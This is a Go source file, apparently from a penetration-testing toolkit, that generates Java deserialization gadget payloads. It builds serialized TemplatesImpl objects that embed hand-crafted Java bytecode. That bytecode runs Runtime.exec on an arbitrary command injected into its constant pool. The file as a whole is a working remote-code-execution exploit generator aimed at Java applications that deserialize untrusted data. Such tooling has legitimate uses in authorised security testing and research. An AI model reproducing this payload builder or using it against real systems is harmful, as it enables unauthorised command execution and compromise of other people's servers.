package yso

import (
	"github.com/yaklang/yaklang/common/javaclassparser"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
	"github.com/yaklang/yaklang/common/yserx"
)

func base64MustDecode(r string) []byte {
	raw, err := codec.DecodeBase64(r)
	if err != nil {
		log.Errorf("base64 must decode failed: %s", err)
	}
	return raw
}
func generateTemplatesWithClassObject(class *javaclassparser.ClassObject) *yserx.JavaObject {
	return yserx.NewJavaObject(
		// 构建 desc
		yserx.NewJavaClassDesc(
			"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
			base64MustDecode("CVdPwW6sqzM="), 3, yserx.NewJavaClassFields(
				yserx.NewJavaClassField("_indentNumber", yserx.JT_INT, nil),
				yserx.NewJavaClassField("_transletIndex", yserx.JT_INT, nil),
				yserx.NewJavaClassField("_bytecodes", yserx.JT_ARRAY, yserx.NewJavaString("[[B")),
				yserx.NewJavaClassField("_class", yserx.JT_ARRAY, yserx.NewJavaString("[Ljava/lang/Class;")),
				yserx.NewJavaClassField("_name", yserx.JT_OBJECT, yserx.NewJavaString("Ljava/lang/String;")),
				yserx.NewJavaClassField("_outputProperties", yserx.JT_OBJECT, yserx.NewJavaString("Ljava/util/Properties;")),
			), nil, nil,
		),
		yserx.NewJavaClassData(nil, nil),
		yserx.NewJavaClassData([]yserx.JavaSerializable{
			yserx.NewJavaFieldValue(yserx.JT_INT, base64MustDecode("AAAAAA==")),
			yserx.NewJavaFieldValue(yserx.JT_INT, base64MustDecode("/////w==")),
			yserx.NewJavaFieldArrayValue(
				yserx.NewJavaArray(
					yserx.NewJavaClassDesc(
						"[[B",
						base64MustDecode("S/0ZFWdn2zc="),
						2, yserx.NewJavaClassFields(), nil, nil,
					),
					yserx.NewJavaFieldBytes(string(class.Bytes())),
				),
			),
			yserx.NewJavaFieldArrayValue(yserx.NewJavaNull()),
			yserx.NewJavaFieldObjectValue(yserx.NewJavaString(utils.RandStringBytes(20))),
			yserx.NewJavaFieldObjectValue(yserx.NewJavaNull()),
		}, []yserx.JavaSerializable{
			yserx.NewJavaBlockDataBytes([]byte{0x00}),
			yserx.NewJavaEndBlockData(),
		}),
	)
}

func generateTemplates(cmd string) *yserx.JavaObject {
	cmd = string(append(yserx.IntTo2Bytes(len(cmd)), []byte(cmd)...))
	// java 字节码
	var a = "\xca\xfe\xba\xbe\x00\x00\x004\x009\n\x00\x03\x00\"\a\x007\a\x00%\a\x00&\x01\x00\x10serialVersionUID\x01\x00\x01J\x01\x00\rConstantValue\x05\xad \x93\xf3\x91\xdd\xef>\x01\x00\x06<init>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x0fLineNumberTable\x01\x00\x12LocalVariableTable\x01\x00\x04this\x01\x00\x10TranslatePayload\x01\x00\fInnerClasses\x01\x00\x1eLClassLoader$TranslatePayload;\x01\x00\ttransform\x01\x00r(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V\x01\x00\bdocument\x01\x00-Lcom/sun/org/apache/xalan/internal/xsltc/DOM;\x01\x00\bhandlers\x01\x00B[Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;\x01\x00\nExceptions\a\x00'\x01\x00\xa6(Lcom/sun/org/apache/xalan/internal/xsltc/DOM;Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;)V\x01\x00\biterator\x01\x005Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;\x01\x00\ahandler\x01\x00ALcom/sun/org/apache/xml/internal/serializer/SerializationHandler;\x01\x00\nSourceFile\x01\x00\x10ClassLoader.java\f\x00\n\x00\v\a\x00(\x01\x00\x1cClassLoader$TranslatePayload\x01\x00@com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet\x01\x00\x14java/io/Serializable\x01\x009com/sun/org/apache/xalan/internal/xsltc/TransletException\x01\x00\vClassLoader\x01\x00\b<clinit>\x01\x00\x11java/lang/Runtime\a\x00*\x01\x00\ngetRuntime\x01\x00\x15()Ljava/lang/Runtime;\f\x00,\x00-\n\x00+\x00.\x01" + cmd + "\b\x000\x01\x00\x04exec\x01\x00'(Ljava/lang/String;)Ljava/lang/Process;\f\x002\x003\n\x00+\x004\x01\x00\rStackMapTable\x01\x00\x04test\x01\x00\x06Ltest;\x00!\x00\x02\x00\x03\x00\x01\x00\x04\x00\x01\x00\x1a\x00\x05\x00\x06\x00\x01\x00\a\x00\x00\x00\x02\x00\b\x00\x04\x00\x01\x00\n\x00\v\x00\x01\x00\f\x00\x00\x00/\x00\x01\x00\x01\x00\x00\x00\x05*\xb7\x00\x01\xb1\x00\x00\x00\x02\x00\r\x00\x00\x00\x06\x00\x01\x00\x00\x00\x15\x00\x0e\x00\x00\x00\f\x00\x01\x00\x00\x00\x05\x00\x0f\x008\x00\x00\x00\x01\x00\x13\x00\x14\x00\x02\x00\f\x00\x00\x00?\x00\x00\x00\x03\x00\x00\x00\x01\xb1\x00\x00\x00\x02\x00\r\x00\x00\x00\x06\x00\x01\x00\x00\x00\x1b\x00\x0e\x00\x00\x00 \x00\x03\x00\x00\x00\x01\x00\x0f\x008\x00\x00\x00\x00\x00\x01\x00\x15\x00\x16\x00\x01\x00\x00\x00\x01\x00\x17\x00\x18\x00\x02\x00\x19\x00\x00\x00\x04\x00\x01\x00\x1a\x00\x01\x00\x13\x00\x1b\x00\x02\x00\f\x00\x00\x00I\x00\x00\x00\x04\x00\x00\x00\x01\xb1\x00\x00\x00\x02\x00\r\x00\x00\x00\x06\x00\x01\x00\x00\x00 \x00\x0e\x00\x00\x00*\x00\x04\x00\x00\x00\x01\x00\x0f\x008\x00\x00\x00\x00\x00\x01\x00\x15\x00\x16\x00\x01\x00\x00\x00\x01\x00\x1c\x00\x1d\x00\x02\x00\x00\x00\x01\x00\x1e\x00\x1f\x00\x03\x00\x19\x00\x00\x00\x04\x00\x01\x00\x1a\x00\b\x00)\x00\v\x00\x01\x00\f\x00\x00\x00$\x00\x03\x00\x02\x00\x00\x00\x0f\xa7\x00\x03\x01L\xb8\x00/\x121\xb6\x005W\xb1\x00\x00\x00\x01\x006\x00\x00\x00\x03\x00\x01\x03\x00\x02\x00 \x00\x00\x00\x02\x00!\x00\x11\x00\x00\x00\n\x00\x01\x00\x02\x00#\x00\x10\x00\t"
	return yserx.NewJavaObject(
		// 构建 desc
		yserx.NewJavaClassDesc(
			"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
			base64MustDecode("CVdPwW6sqzM="), 3, yserx.NewJavaClassFields(
				yserx.NewJavaClassField("_indentNumber", yserx.JT_INT, nil),
				yserx.NewJavaClassField("_transletIndex", yserx.JT_INT, nil),
				yserx.NewJavaClassField("_bytecodes", yserx.JT_ARRAY, yserx.NewJavaString("[[B")),
				yserx.NewJavaClassField("_class", yserx.JT_ARRAY, yserx.NewJavaString("[Ljava/lang/Class;")),
				yserx.NewJavaClassField("_name", yserx.JT_OBJECT, yserx.NewJavaString("Ljava/lang/String;")),
				yserx.NewJavaClassField("_outputProperties", yserx.JT_OBJECT, yserx.NewJavaString("Ljava/util/Properties;")),
			), nil, nil,
		),
		yserx.NewJavaClassData(nil, nil),
		yserx.NewJavaClassData([]yserx.JavaSerializable{
			yserx.NewJavaFieldValue(yserx.JT_INT, base64MustDecode("AAAAAA==")),
			yserx.NewJavaFieldValue(yserx.JT_INT, base64MustDecode("/////w==")),
			yserx.NewJavaFieldArrayValue(
				yserx.NewJavaArray(
					yserx.NewJavaClassDesc(
						"[[B",
						base64MustDecode("S/0ZFWdn2zc="),
						2, yserx.NewJavaClassFields(), nil, nil,
					),
					yserx.NewJavaFieldBytes(a),
				),
			),
			yserx.NewJavaFieldArrayValue(yserx.NewJavaNull()),
			yserx.NewJavaFieldObjectValue(yserx.NewJavaString(utils.RandStringBytes(20))),
			yserx.NewJavaFieldObjectValue(yserx.NewJavaNull()),
		}, []yserx.JavaSerializable{
			yserx.NewJavaBlockDataBytes([]byte{0x00}),
			yserx.NewJavaEndBlockData(),
		}),
	)
}

func GenerateTemplates(cmd string) []*yserx.JavaObject {
	var res []*yserx.JavaObject
	for _, i := range AllCmdWrapper(cmd) {
		ret := generateTemplates(i)
		res = append(res, ret)
	}
	return res
}
